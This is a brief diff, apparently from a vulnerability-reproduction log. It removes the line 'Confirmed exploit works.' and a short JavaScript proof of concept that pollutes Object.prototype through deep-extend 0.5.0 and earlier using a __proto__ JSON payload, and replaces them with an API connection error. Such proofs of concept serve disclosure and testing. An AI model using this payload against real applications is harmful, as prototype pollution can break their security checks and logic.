@@ -1,14 +1,1 @@
-Confirmed exploit works.
-
-```javascript
-const deepExtend = require("deep-extend");
-
-// deep-extend <=0.5.0 recursively copies keys (the sliced `args`) from
-// the source object(s) into the target without filtering "__proto__",
-// letting an attacker pollute Object.prototype for every object in the process.
-const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
-
-deepExtend({}, payload);
-
-console.log(({}).polluted); // "yes" -- Object.prototype has been polluted
-```
+API Error: Unable to connect to API (ConnectionRefused)
